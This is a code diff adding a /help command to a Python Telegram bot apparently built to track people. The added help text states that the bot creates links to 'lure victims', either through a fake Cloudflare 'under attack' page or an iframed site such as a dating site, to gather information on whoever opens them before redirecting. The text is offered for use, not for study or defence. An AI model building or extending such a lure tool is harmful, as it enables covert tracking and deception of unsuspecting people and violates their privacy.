@@ -126,5 +126,17 @@ DEV - DarkHacker 🕷"""
     except Exception as e:
         bot.send_message(message.chat.id, "Invalid URL format! Please try again by sending a correct link.")
         user_state[message.from_user.id] = "waiting_for_link"
+@bot.message_handler(commands=['help'])
+def send_help(message):
+    help_text = """THROUGH THIS BOT 🤖 YOU CAN TRACK PEOPLE JUST BY SENDING A SIMPLE LINK 🔗.
 
+SEND /create TO BEGIN , AFTERWARDS IT WILL ASK YOU FOR A URL WHICH WILL BE USED IN IFRAME TO LURE VICTIMS. AFTER RECEIVING THE URL IT WILL SEND YOU 2 LINKS WHICH YOU CAN USE TO TRACK PEOPLE.
+
+𝑆𝑃𝐸𝐶𝐼𝐹𝐼𝐶𝐴𝑇𝐼𝑂𝑁𝑆.
+1. CLOUDFLARE LINK: THIS METHOD WILL SHOW A CLOUDFLARE UNDER ATTACK PAGE TO GATHER INFORMATIONS AND AFTERWARDS VICTIM WILL BE REDIRECTED TO DESTINATIONED URL.
+2. WEBVIEW LINK: THIS WILL SHOW A WEBSITE (ex bing , DATING SITES ETC) USING IFRAME FOR GATHERING INFORMATION.( ⚠️ MANY SITES MAY NOT WORK UNDER THIS METHOD IF THEY HAVE X-FRAME HEADER PRESENT.ex HTTPS://google.com )
+
+OWNER - @darkhacker1230"""
+    
+    bot.reply_to(message, help_text)
 bot.infinity_polling()
